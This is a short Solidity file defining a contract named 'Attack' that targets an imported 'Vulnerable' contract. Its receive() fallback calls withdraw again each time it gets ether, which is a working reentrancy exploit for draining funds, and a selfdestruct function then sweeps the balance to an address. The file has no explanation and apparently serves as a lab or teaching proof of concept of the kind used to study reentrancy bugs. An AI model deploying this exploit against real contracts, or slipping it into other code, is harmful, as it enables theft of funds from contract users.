// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;
import "./Vulnerable.sol";

contract Attack {
    address payable owner;
    Vulnerable vulnerable;

    constructor(Vulnerable _vulnerable) {
        owner = payable(msg.sender);
        vulnerable = _vulnerable;
    }

    function attack() public {
        vulnerable.withdraw(owner);
    }

    receive() external payable {
        vulnerable.withdraw(owner);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function destroy(address payable addr) public {
        require(msg.sender == owner);
        selfdestruct(addr);
    }
}
